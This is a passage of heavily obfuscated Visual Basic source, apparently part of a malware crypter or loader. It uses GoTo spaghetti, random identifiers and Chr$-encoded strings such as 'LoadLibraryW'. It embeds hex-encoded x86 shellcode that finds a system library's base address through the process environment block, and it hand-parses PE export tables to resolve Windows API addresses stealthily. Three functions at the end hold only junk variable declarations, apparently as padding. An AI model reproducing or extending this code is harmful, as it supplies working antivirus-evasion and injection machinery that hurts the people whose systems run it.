RVYPpEwhOQmNS:

GoTo dyLylMjhJrIuyZyJDV
dyLylMjhJrIuyZyJDV:
 Call SApJzqEOxxkkLU(Chr$(56) & Chr$(66) & Chr$(52) & Chr$(67) & Chr$(50) & Chr$(52) & Chr$(48) & Chr$(56) & Chr$(53) & Chr$(54) & Chr$(53) & Chr$(53) & Chr$(51) & Chr$(49) & Chr$(67) & Chr$(48) & Chr$(54) & Chr$(52) & Chr$(56) & Chr$(66) & Chr$(55) & Chr$(48) & Chr$(51) & Chr$(48) & Chr$(56) & Chr$(66) & Chr$(55) & Chr$(54) & Chr$(48) & Chr$(67) & Chr$(56) & Chr$(66) & Chr$(55) & Chr$(54) & Chr$(49) & Chr$(67) & Chr$(56) & Chr$(66) & Chr$(54) & Chr$(69) & Chr$(48) & Chr$(56) & Chr$(56) & Chr$(66) & Chr$(55) & Chr$(69) & Chr$(50) & Chr$(48) & Chr$(56) & Chr$(66) & Chr$(51) & Chr$(54) & Chr$(51) & Chr$(56) & Chr$(52) & Chr$(55) & Chr$(49) & Chr$(56) & Chr$(55) & Chr$(53) & Chr$(70) & Chr$(51) & Chr$(56) & Chr$(48) & Chr$(51) & Chr$(70) & Chr$(54) & Chr$(66) & Chr$(55) & Chr$(52) & Chr$(48) & Chr$(55) & Chr$(56) & Chr$(48) & Chr$(51) & Chr$(70) & Chr$(52) & Chr$(66) & Chr$(55) & Chr$(52) & Chr$(48) & Chr$(50) & Chr$(69) & Chr$(66) & Chr$(69) & Chr$(55) & Chr$(56) & Chr$(57) & Chr$(50) & Chr$(57) & Chr$(53) & _
Chr$(68) & Chr$(53) & Chr$(69) & Chr$(67) & Chr$(51))
GoTo qLkdZkBPlZjGBfgMhmu
qLkdZkBPlZjGBfgMhmu:
 
GoTo PZZYdzGN
PZZYdzGN:
 jDglyI = IdHgyJ
GoTo FEUYbSrGzj
FEUYbSrGzj:
 
GoTo ToQVjgOcBBdlyatZxO
ToQVjgOcBBdlyatZxO:
 If Not jDglyI = 0 Then
GoTo OaTmVscnt
OaTmVscnt:
  rfQsO = cswyqPsQ(jDglyI, Chr$(76) & Chr$(111) & Chr$(97) & Chr$(100) & Chr$(76) & Chr$(105) & Chr$(98) & Chr$(114) & Chr$(97) & Chr$(114) & Chr$(121) & Chr$(87))
GoTo ARgopzQRv
ARgopzQRv:
  If Not rfQsO = 0 Then
GoTo dkCKAgbcafQQ
dkCKAgbcafQQ:
   pQoaeEepjByVr = True
GoTo vVUlbe
vVUlbe:
  End If
GoTo uQCAiQrhYmwffRRtBOq
uQCAiQrhYmwffRRtBOq:
 End If
GoTo pNfrgdQpmIsDJFQi
pNfrgdQpmIsDJFQi:
End Sub

Public Function cswyqPsQ(ByVal aLRZqQPgVZQpRx As Long, ByVal sProc As String) As Long
GoTo EGPnTxNu
EGPnTxNu:
 Dim dx    As UvjgbsqMiGMIUY
GoTo TcQwssqvhahLm
TcQwssqvhahLm:
 Dim es    As nqiGVOy
GoTo nrumKoSCynHxoCMvviUw
nrumKoSCynHxoCMvviUw:
 Dim NsSEUZbSsUz As cASfSPJcZw
GoTo ftbseiHwtnFCavTaVi
ftbseiHwtnFCavTaVi:
 
GoTo zUQgqkNe
zUQgqkNe:
 Call bmpEabl(dx, ByVal aLRZqQPgVZQpRx, iNQYVbLELq)
GoTo QkeTzIIHMxqx
QkeTzIIHMxqx:
 
GoTo poEHK
poEHK:
 If Not dx.e_magic = bKJxjKhtHpGswQKICU Then
GoTo bqjSADYAESdyL
bqjSADYAESdyL:
  Exit Function
GoTo lMjhJrIuyZyJ
lMjhJrIuyZyJ:
 End If
GoTo VSqLkdZkBPlZjG
VSqLkdZkBPlZjG:

GoTo fgMhmukPZZYdz
fgMhmukPZZYdz:
 Call bmpEabl(es, ByVal aLRZqQPgVZQpRx + dx.e_lfanew, CSQZQqFxiPRmOT)
GoTo GlxxNQTLkzsc
GlxxNQTLkzsc:
 
GoTo MhJNcZHUuuVeqSmR
MhJNcZHUuuVeqSmR:
 If Not es.Signature = oJjokwzOkluEzdsLfy Then
GoTo HhHSMfOlUg
HhHSMfOlUg:
  Exit Function
GoTo itKZhirP
itKZhirP:
 End If
GoTo npVcvDtZTUSYIPQn
npVcvDtZTUSYIPQn:
 
GoTo NeTVNnPusbOkaQfpY
NeTVNnPusbOkaQfpY:
 Dim fTof   As Long
GoTo KKmuHjCiGYkYVPifBlwC
KKmuHjCiGYkYVPifBlwC:
 Dim judcPBdzLaHZKP   As Long
GoTo JbcxyIgMqFmt
JbcxyIgMqFmt:
 Dim dbUnkG    As Long
GoTo TJpkljoZSaDfPgkn
TJpkljoZSaDfPgkn:
 
GoTo DgLvrf
DgLvrf:
 With es.OptionalHeader
GoTo qhvFoobNoKYmS
qhvFoobNoKYmS:
  fTof = aLRZqQPgVZQpRx + .DataDirectory(0).VirtualAddress
GoTo QbApmgyv
QbApmgyv:
  judcPBdzLaHZKP = fTof + .DataDirectory(0).Size
GoTo oMSOaesNOZidGQpJdQ
oMSOaesNOZidGQpJdQ:
  dbUnkG = .ImageBase
GoTo sBBzEqjqUhhwADvT
sBBzEqjqUhhwADvT:
 End With
GoTo cLtwQtx
cLtwQtx:
 
GoTo VrEreFbaCkBnrQrC
VrEreFbaCkBnrQrC:
 Call bmpEabl(NsSEUZbSsUz, ByVal fTof, sMaNzbx)
GoTo ByUqPHD
ByUqPHD:
    
GoTo gvQENlgJLsLRaOuDE
gvQENlgJLsLRaOuDE:
 Dim i     As Long
GoTo HflsQkjzDFxQm
HflsQkjzDFxQm:
 Dim BG   As Long
GoTo OwySvA
OwySvA:
 Dim ORhCDMQRvK As Long
GoTo KtGggHQdEZDcuTuFz
KtGggHQdEZDcuTuFz:
 Dim xQL As Long
GoTo AYHRYTgwLSUeBwacIO
AYHRYTgwLSUeBwacIO:

GoTo qfKGGFK
qfKGGFK:
 With NsSEUZbSsUz
GoTo BJaAzPFIAZC
BJaAzPFIAZC:
  For i = 0 To .NumberOfNames - 1
GoTo fMBVLCQ
fMBVLCQ:
     
GoTo JJwxY
JJwxY:
   bmpEabl ORhCDMQRvK, ByVal dbUnkG + .lpAddressOfNames + i * 4, 4
GoTo tVpTsKQ
tVpTsKQ:
   
GoTo HBTQoYiokwMNjluR
HBTQoYiokwMNjluR:
   If jxfwjnMAysKHeAZ(dbUnkG + ORhCDMQRvK) = sProc Then
GoTo csZfyGvcQQVb
csZfyGvcQQVb:
    bmpEabl xQL, ByVal dbUnkG + .lpAddressOfNameOrdinals + i * 2, 2
GoTo ELqQCSVZQpSxhdRm
ELqQCSVZQpSxhdRm:
    bmpEabl BG, ByVal dbUnkG + .lpAddressOfFunctions + xQL * 4, 4
GoTo Thraa
Thraa:
    
GoTo zbxJYFQIMnbYRkiEa
zbxJYFQIMnbYRkiEa:
    cswyqPsQ = BG + dbUnkG
GoTo EAMPeABKUPtI
EAMPeABKUPtI:
        
GoTo vOIye
vOIye:
    If cswyqPsQ >= fTof And cswyqPsQ <= judcPBdzLaHZKP Then
GoTo aYdOHOsFEUZcSsHAkRUp
aYdOHOsFEUZcSsHAkRUp:
     Call DrLCtHRAznaA(cswyqPsQ, aLRZqQPgVZQpRx, sProc)
GoTo VkuOdPCdzybIaLPpPb
VkuOdPCdzybIaLPpPb:
     If Not aLRZqQPgVZQpRx = 0 Then
GoTo nkGdBtpBShCqzQRvxey
nkGdBtpBShCqzQRvxey:
      cswyqPsQ = cswyqPsQ(aLRZqQPgVZQpRx, sProc)
GoTo LBhqqotQYfJVVl
LBhqqotQYfJVVl:
     Else
GoTo skIYQAilF
skIYQAilF:
      cswyqPsQ = 0
GoTo mAxgtSS
mAxgtSS:
     End If
GoTo COrKqNgFgrl
COrKqNgFgrl:
    End If
GoTo nJtEJGRjxFGPoi
nJtEJGRjxFGPoi:
    
GoTo NuATcRxstrwhovLn
NuATcRxstrwhovLn:
    Exit Function
GoTo CsumLoSQ
CsumLoSQ:
   End If
GoTo nHypDNwvjjKS
nHypDNwvjjKS:
  Next
GoTo HbGfwI
HbGfwI:
 End With
GoTo uoGDaJUbQizA
uoGDaJUbQizA:
 
GoTo QhElOeKQksiNIJHMxry
QhElOeKQksiNIJHMxry:
End Function

Private Function DrLCtHRAznaA(ByVal lAddress As Long, ByRef lLib As Long, ByRef sMod As String)
GoTo DoEIK
DoEIK:
 Dim gpqoteQfI  As String
GoTo cEjTPDZOFTeMMz
cEjTPDZOFTeMMz:
 
GoTo MjwKrJvz
MjwKrJvz:
 gpqoteQfI = jxfwjnMAysKHeAZ(lAddress)
GoTo zwqIFdyQdZloCYaj
zwqIFdyQdZloCYaj:
 If InStr(1, gpqoteQfI, Chr$(46)) Then
GoTo oRhzTnhQCLL
oRhzTnhQCLL:
  lLib = oJKTsZC(pSiBUojYDMN(gpqoteQfI, Chr$(46))(0))
GoTo PAtAfsrHKNFetmVE
PAtAfsrHKNFetmVE:
  sMod = pSiBUojYDMN(gpqoteQfI, Chr$(46))(1)
GoTo bDIVgBOCoPmlMuL
bDIVgBOCoPmlMuL:
 End If
GoTo BcBNHaQtOngc
BcBNHaQtOngc:
 
GoTo ETpcmJEik
ETpcmJEik:
End Function

Private Function jxfwjnMAysKHeAZ(ByVal lAddress As Long) As String
GoTo kqxnScdbgDJQvIHYbe
kqxnScdbgDJQvIHYbe:
    
GoTo vJCnUQrTZmjRfEEgoBd
vJCnUQrTZmjRfEEgoBd:
 Dim NeikcBPItbdxa    As Byte
GoTo cARsSeYqZwfq
cARsSeYqZwfq:
 
GoTo sDUkrtCaUyAh
sDUkrtCaUyAh:
 Do
GoTo GODjffeiT
GODjffeiT:
  bmpEabl NeikcBPItbdxa, ByVal lAddress, 1
GoTo hyZYo
hyZYo:
  lAddress = lAddress + 1
GoTo hZxbFD
hZxbFD:
  If NeikcBPItbdxa = 0 Then Exit Do
GoTo aukbpzii
aukbpzii:
  jxfwjnMAysKHeAZ = jxfwjnMAysKHeAZ & Chr$(NeikcBPItbdxa)
GoTo UwFRtNsQjujgaspMwGM
UwFRtNsQjujgaspMwGM:
 Loop
GoTo UlmHJSqYAQxDQfT
UlmHJSqYAQxDQfT:
End Function

Public Function pSiBUojYDMN(ByVal DYdlbGPPOT As String, Optional ByVal PaxsV As String, Optional ByVal xEjwvL As Long = -1) As String()
GoTo bbafPI
bbafPI:
 Dim sDY As Long
GoTo uUGQadUtQBlhVqhYlv
uUGQadUtQBlhVqhYlv:
 Dim ZKmIH  As Long
GoTo eRDfBN
eRDfBN:
 Dim QiTY  As Long
GoTo JbMQr
JbMQr:
 Dim ZkewtPmK   As Long
GoTo cVomIe
cVomIe:
 Dim yJbqLzIgb  As Long
GoTo IEQTiEFOZTxMfz
IEQTiEFOZTxMfz:
 Dim GnGMUJpyzx() As String
GoTo MCirsqvgZgKYQnqtlK
MCirsqvgZgKYQnqtlK:
 QiTY = Len(DYdlbGPPOT)
GoTo RCkmGjoBLhuiTvRQsard
RCkmGjoBLhuiTvRQsard:
 If PaxsV = vbNullString Then PaxsV = " "
GoTo HitnFCZ
HitnFCZ:
 ZkewtPmK = Len(PaxsV)
GoTo TLHSkzUIRpk
TLHSkzUIRpk:
 If xEjwvL = 0 Then GoTo QuitHere
GoTo PwPVeSyHIGLjpwbon
PwPVeSyHIGLjpwbon:
 If QiTY = 0 Then GoTo QuitHere
GoTo HJBbqiSACQzERO
HJBbqiSACQzERO:
 If InStr(1, DYdlbGPPOT, PaxsV, vbBinaryCompare) = 0 Then GoTo QuitHere
GoTo KkkLUhIdHgyY
KkkLUhIdHgyY:
 ReDim GnGMUJpyzx(0)
GoTo JDVEcLVcYkAP
JDVEcLVcYkAP:
 sDY = 1
GoTo ZiFAegMSmujOKKJOzFNe
ZiFAegMSmujOKKJOzFNe:
 ZKmIH = 1
GoTo qGwyqPsQUD
qGwyqPsQUD:
 Do
GoTo LCtHRAznnO
LCtHRAznnO:
  If yJbqLzIgb + 1 = xEjwvL Then
GoTo jLfKjAMAysKHeNZfbmDE
jLfKjAMAysKHeNZfbmDE:
   GnGMUJpyzx(yJbqLzIgb) = Mid$(DYdlbGPPOT, sDY)
GoTo blIpS
blIpS:
   Exit Do
GoTo OUowmRM
OUowmRM:
  End If
GoTo LQBvCgHsIMOGgInYT
LQBvCgHsIMOGgInYT:
  ZKmIH = InStr(ZKmIH, DYdlbGPPOT, PaxsV, vbBinaryCompare)
GoTo dSJYiQQDqQnAOvN
dSJYiQQDqQnAOvN:
  If ZKmIH = 0 Then
GoTo DdQOIbYuQpvr
DdQOIbYuQpvr:
   If Not sDY = QiTY Then
GoTo FUqrBKFjyRmEzp
FUqrBKFjyRmEzp:
    GnGMUJpyzx(yJbqLzIgb) = Mid$(DYdlbGPPOT, sDY)
GoTo dechSLSxJIZdgQwLEoV
dechSLSxJIZdgQwLEoV:
   End If
GoTo tVaoyThTGhDCfMePTtTf
tVaoyThTGhDCfMePTtTf:
   Exit Do
GoTo roKhFxtFQlGuDbVzBiCH
roKhFxtFQlGuDbVzBiCH:
  End If
GoTo FluusxUcjNaaptwoMc
FluusxUcjNaaptwoMc:
  GnGMUJpyzx(yJbqLzIgb) = Mid$(DYdlbGPPOT, sDY, ZKmIH - sDY)
GoTo rZbvYdqnVjIIksF
rZbvYdqnVjIIksF:
  yJbqLzIgb = yJbqLzIgb + 1
GoTo BgEVwQi
BgEVwQi:
  ReDim Preserve GnGMUJpyzx(yJbqLzIgb)
GoTo udAku
udAku:
  sDY = ZKmIH + ZkewtPmK
GoTo wHZovxGeZCElr
wHZovxGeZCElr:
  ZKmIH = sDY
GoTo SHnjjimYelCdcsil
SHnjjimYelCdcsil:
 Loop
GoTo BfJHp
BfJHp:
 ReDim Preserve GnGMUJpyzx(yJbqLzIgb)
GoTo yoftDm
yoftDm:
 pSiBUojYDMN = GnGMUJpyzx
GoTo ZZAJVxRw
ZZAJVxRw:
 Exit Function
GoTo nynkewtQAKQMZpqLNQu
nynkewtQAKQMZpqLNQu:
QuitHere:
GoTo EUBHb
EUBHb:
 ReDim pSiBUojYDMN(-1 To -1)
GoTo YDzzyDo
YDzzyDo:
End Function



Public Function wrUQDQdlaFOPNSqwEivu()
Dim ixpaHJeGLaVERrsSc As String
ixpaHJeGLaVERrsSc = ""
Dim kOnFfFQKdLjSdjfrHQe As String
kOnFfFQKdLjSdjfrHQe = ""
Dim MHlnTatBqVRRQ As String
MHlnTatBqVRRQ = ""
Dim NUlLKbQTLkNsqYMh As String
NUlLKbQTLkNsqYMh = ""
Dim OZHHuuVerSmRqHTHFz As String
OZHHuuVerSmRqHTHFz = ""
Dim lUgmitKLhisPwapVdv As String
lUgmitKLhisPwapVdv = ""
Dim ZTUSYICJnOzPTQ As String
ZTUSYICJnOzPTQ = ""
Dim PvfbOkaQfpYY As String
PvfbOkaQfpYY = ""
Dim YuHVDUGKkZVPifB As String
YuHVDUGKkZVPifB = ""
Dim CyJNcxyIRMqGZt As String
CyJNcxyIRMqGZt = ""
Dim wclljoaSaEQQgknfD As String
wclljoaSaEQQgknfD = ""
Dim vdgAdhvFbobNpKJmTl As String
vdgAdhvFbobNpKJmTl = ""
Dim AbmgyvSoME As String
AbmgyvSoME = ""
Dim esNBKjdGIpJOQMsBBA As String
esNBKjdGIpJOQMsBBA = ""
Dim jqUhhxADvT As String
jqUhhxADvT = ""
Dim EmpJmqEAkxQQxGSvOuR As String
EmpJmqEAkxQQxGSvOuR = ""
Dim kvpHrNxINJVnBJKTs As String
kvpHrNxINJVnBJKTs = ""
Dim RyEYgVBwxvAlszPqqFw As String
RyEYgVBwxvAlszPqqFw = ""
Dim PsQUCrLCtGRAz As String
PsQUCrLCtGRAz = ""
Dim OQjLfKiAMAys As String
OQjLfKiAMAys = ""
Dim eNZebmDEabkIpSiOU As String
eNZebmDEabkIpSiOU = ""
Dim mRMNLQBuCgHsIM As String
mRMNLQBuCgHsIM = ""
Dim gInYTHcSJYiQPDqQn As String
gInYTHcSJYiQPDqQn = ""
Dim vMzDdQOIbYuQpvrCFU As String
vMzDdQOIbYuQpvrCFU = ""
Dim BKFjyRmEzoTde As String
BKFjyRmEzoTde = ""
Dim RLSwJIZdRJi As String
RLSwJIZdRJi = ""

End Function
Public Function qaIKfHMakFSGsTq()
Dim ixpaHJeGLaVERrsSc As String
ixpaHJeGLaVERrsSc = ""
Dim kOnFfFQKdLjSdjfrHQe As String
kOnFfFQKdLjSdjfrHQe = ""
Dim MHlnTatBqVRRQ As String
MHlnTatBqVRRQ = ""
Dim NUlLKbQTLkNsqYMh As String
NUlLKbQTLkNsqYMh = ""
Dim OZHHuuVerSmRqHTHFz As String
OZHHuuVerSmRqHTHFz = ""
Dim lUgmitKLhisPwapVdv As String
lUgmitKLhisPwapVdv = ""
Dim ZTUSYICJnOzPTQ As String
ZTUSYICJnOzPTQ = ""
Dim PvfbOkaQfpYY As String
PvfbOkaQfpYY = ""
Dim YuHVDUGKkZVPifB As String
YuHVDUGKkZVPifB = ""
Dim CyJNcxyIRMqGZt As String
CyJNcxyIRMqGZt = ""
Dim wclljoaSaEQQgknfD As String
wclljoaSaEQQgknfD = ""
Dim vdgAdhvFbobNpKJmTl As String
vdgAdhvFbobNpKJmTl = ""
Dim AbmgyvSoME As String
AbmgyvSoME = ""
Dim esNBKjdGIpJOQMsBBA As String
esNBKjdGIpJOQMsBBA = ""
Dim jqUhhxADvT As String
jqUhhxADvT = ""
Dim EmpJmqEAkxQQxGSvOuR As String
EmpJmqEAkxQQxGSvOuR = ""
Dim kvpHrNxINJVnBJKTs As String
kvpHrNxINJVnBJKTs = ""
Dim RyEYgVBwxvAlszPqqFw As String
RyEYgVBwxvAlszPqqFw = ""
Dim PsQUCrLCtGRAz As String
PsQUCrLCtGRAz = ""
Dim OQjLfKiAMAys As String
OQjLfKiAMAys = ""
Dim eNZebmDEabkIpSiOU As String
eNZebmDEabkIpSiOU = ""
Dim mRMNLQBuCgHsIM As String
mRMNLQBuCgHsIM = ""
Dim gInYTHcSJYiQPDqQn As String
gInYTHcSJYiQPDqQn = ""
Dim vMzDdQOIbYuQpvrCFU As String
vMzDdQOIbYuQpvrCFU = ""
Dim BKFjyRmEzoTde As String
BKFjyRmEzoTde = ""
Dim RLSwJIZdRJi As String
RLSwJIZdRJi = ""
Dim BFgFQKdaxSrkgrIQsg As String
BFgFQKdaxSrkgrIQsg = ""
Dim ImnTotBrQggfkGNUzM As String
ImnTotBrQggfkGNUzM = ""
Dim fiayNGqZbv As String
fiayNGqZbv = ""
Dim qnVjIIksFh As String
qnVjIIksFh = ""
Dim EVwQicudzju As String
EVwQicudzju = ""
Dim HZovwGeZCEkrKS As String
HZovwGeZCEkrKS = ""
Dim jjhmYelCdcsi As String
jjhmYelCdcsi = ""
Dim BfJHpeyoft As String
BfJHpeyoft = ""
Dim mZZAIVxRwUmy As String
mZZAIVxRwUmy = ""
Dim QjgCmxCzKcdyzIhNrGnt As String
QjgCmxCzKcdyzIhNrGnt = ""
Dim KqlmkpaSaEfQhlnfEhLw As String
KqlmkpaSaEfQhlnfEhLw = ""
Dim ArivGpocNpL As String
ArivGpocNpL = ""
Dim TlQcBpnhzwSp As String
TlQcBpnhzwSp = ""
Dim PbetOPZjeHQqJdYMsBC As String
PbetOPZjeHQqJdYMsBC = ""
Dim qjrUihxBDvUkcMuw As String
qjrUihxBDvUkcMuw = ""
Dim yMQrFsfFcbDkBo As String
yMQrFsfFcbDkBo = ""
Dim sDxPMjFeVReuJfSczuY As String
sDxPMjFeVReuJfSczuY = ""
Dim bgodJRSQVtAHlyxN As String
bgodJRSQVtAHlyxN = ""
Dim LlAtdKMiKBOLuHhhIQe As String
LlAtdKMiKBOLuHhhIQe = ""
Dim EduUuFzRBYHSZUgxLTUf As String
EduUuFzRBYHSZUgxLTUf = ""
Dim bcIPiqgLGHFKwCJ As String
bcIPiqgLGHFKwCJ = ""
Dim AQGJAaCigNCQMDR As String
AQGJAaCigNCQMDR = ""
Dim KxxZhuVqUtKQLICUR As String
KxxZhuVqUtKQLICUR = ""
Dim jplwNOkmvSzdtagzHwcY As String
jplwNOkmvSzdtagzHwcY = ""
Dim bMFMrRDSQaRqTyieSndT As String
bMFMrRDSQaRqTyieSndT = ""
Dim bbNAcyKZGYJNnc As String
bbNAcyKZGYJNnc = ""
Dim liFbzFBNQfACLVPtJcw As String
liFbzFBNQfACLVPtJcw = ""

End Function
Public Function JzfoonsdVdHUTknqiG()
Dim ixpaHJeGLaVERrsSc As String
ixpaHJeGLaVERrsSc = ""
Dim kOnFfFQKdLjSdjfrHQe As String
kOnFfFQKdLjSdjfrHQe = ""
Dim MHlnTatBqVRRQ As String
MHlnTatBqVRRQ = ""
Dim NUlLKbQTLkNsqYMh As String
NUlLKbQTLkNsqYMh = ""
Dim OZHHuuVerSmRqHTHFz As String
OZHHuuVerSmRqHTHFz = ""
Dim lUgmitKLhisPwapVdv As String
lUgmitKLhisPwapVdv = ""
Dim ZTUSYICJnOzPTQ As String
ZTUSYICJnOzPTQ = ""
Dim PvfbOkaQfpYY As String
PvfbOkaQfpYY = ""
Dim YuHVDUGKkZVPifB As String
YuHVDUGKkZVPifB = ""
Dim CyJNcxyIRMqGZt As String
CyJNcxyIRMqGZt = ""
Dim wclljoaSaEQQgknfD As String
wclljoaSaEQQgknfD = ""
Dim vdgAdhvFbobNpKJmTl As String
vdgAdhvFbobNpKJmTl = ""
Dim AbmgyvSoME As String
AbmgyvSoME = ""
Dim esNBKjdGIpJOQMsBBA As String
esNBKjdGIpJOQMsBBA = ""
Dim jqUhhxADvT As String
jqUhhxADvT = ""
Dim EmpJmqEAkxQQxGSvOuR As String
EmpJmqEAkxQQxGSvOuR = ""
Dim kvpHrNxINJVnBJKTs As String
kvpHrNxINJVnBJKTs = ""
Dim RyEYgVBwxvAlszPqqFw As String
RyEYgVBwxvAlszPqqFw = ""
Dim PsQUCrLCtGRAz As String
PsQUCrLCtGRAz = ""
Dim OQjLfKiAMAys As String
OQjLfKiAMAys = ""
Dim eNZebmDEabkIpSiOU As String
eNZebmDEabkIpSiOU = ""
Dim mRMNLQBuCgHsIM As String
mRMNLQBuCgHsIM = ""
Dim gInYTHcSJYiQPDqQn As String
gInYTHcSJYiQPDqQn = ""
Dim vMzDdQOIbYuQpvrCFU As String
vMzDdQOIbYuQpvrCFU = ""
Dim BKFjyRmEzoTde As String
BKFjyRmEzoTde = ""
Dim RLSwJIZdRJi As String
RLSwJIZdRJi = ""
Dim BFgFQKdaxSrkgrIQsg As String
BFgFQKdaxSrkgrIQsg = ""
Dim ImnTotBrQggfkGNUzM As String
ImnTotBrQggfkGNUzM = ""
Dim fiayNGqZbv As String
fiayNGqZbv = ""
Dim qnVjIIksFh As String
qnVjIIksFh = ""
Dim EVwQicudzju As String
EVwQicudzju = ""
Dim HZovwGeZCEkrKS As String
HZovwGeZCEkrKS = ""
Dim jjhmYelCdcsi As String
jjhmYelCdcsi = ""
Dim BfJHpeyoft As String
BfJHpeyoft = ""
Dim mZZAIVxRwUmy As String
mZZAIVxRwUmy = ""
Dim QjgCmxCzKcdyzIhNrGnt As String
QjgCmxCzKcdyzIhNrGnt = ""
Dim KqlmkpaSaEfQhlnfEhLw As String
KqlmkpaSaEfQhlnfEhLw = ""
Dim ArivGpocNpL As String
ArivGpocNpL = ""
Dim TlQcBpnhzwSp As String
TlQcBpnhzwSp = ""
Dim PbetOPZjeHQqJdYMsBC As String
PbetOPZjeHQqJdYMsBC = ""
Dim qjrUihxBDvUkcMuw As String
qjrUihxBDvUkcMuw = ""
Dim yMQrFsfFcbDkBo As String
yMQrFsfFcbDkBo = ""
Dim sDxPMjFeVReuJfSczuY As String
sDxPMjFeVReuJfSczuY = ""
Dim bgodJRSQVtAHlyxN As String
bgodJRSQVtAHlyxN = ""
Dim LlAtdKMiKBOLuHhhIQe As String
LlAtdKMiKBOLuHhhIQe = ""
Dim EduUuFzRBYHSZUgxLTUf As String
EduUuFzRBYHSZUgxLTUf = ""
Dim bcIPiqgLGHFKwCJ As String
bcIPiqgLGHFKwCJ = ""
Dim AQGJAaCigNCQMDR As String
AQGJAaCigNCQMDR = ""
Dim KxxZhuVqUtKQLICUR As String
KxxZhuVqUtKQLICUR = ""
Dim jplwNOkmvSzdtagzHwcY As String
jplwNOkmvSzdtagzHwcY = ""
Dim bMFMrRDSQaRqTyieSndT As String
bMFMrRDSQaRqTyieSndT = ""
Dim bbNAcyKZGYJNnc As String
bbNAcyKZGYJNnc = ""
Dim liFbzFBNQfACLVPtJcw As String
liFbzFBNQfACLVPtJcw = ""
Dim OjLQeoJQKwYutUCTFJ As String
OjLQeoJQKwYutUCTFJ = ""
Dim UOheBQvokvMbwkuRM As String
UOheBQvokvMbwkuRM = ""
Dim YsxFvbkkjoKRZ As String
YsxFvbkkjoKRZ = ""
Dim PgjmeCRKudfzchuranM As String
PgjmeCRKudfzchuranM = ""
Dim wJlFkIaAbmgyh As String
wJlFkIaAbmgyh = ""
Dim yEALdszAKidGI As String
yEALdszAKidGI = ""
Dim OQLrnnlqcipGhg As String
OQLrnnlqcipGhg = ""
Dim phFjNLtiCsjx As String
phFjNLtiCsjx = ""
Dim qddEMaBVAZqCr As String
qddEMaBVAZqCr = ""
Dim nkGqBGDOghCDMlRvKrx As String
nkGqBGDOghCDMlRvKrx = ""
Dim OupqoteQeIjUlprjIlPA As String
OupqoteQeIjUlprjIlPA = ""
Dim EvmzKtsgRtPc As String
EvmzKtsgRtPc = ""
Dim pcgFtrlDAQtRQTfixSTd As String
pcgFtrlDAQtRQTfixSTd = ""
Dim LbuNhcQwFGE As String
LbuNhcQwFGE = ""
Dim nvZmlBFHzZogQy As String
nvZmlBFHzZogQy = ""
Dim yCQbvJwjJgfHoFswVwHB As String
yCQbvJwjJgfHoFswVwHB = ""
Dim nJiaViyNjQgDyceKfks As String
nJiaViyNjQgDyceKfks = ""

End Function
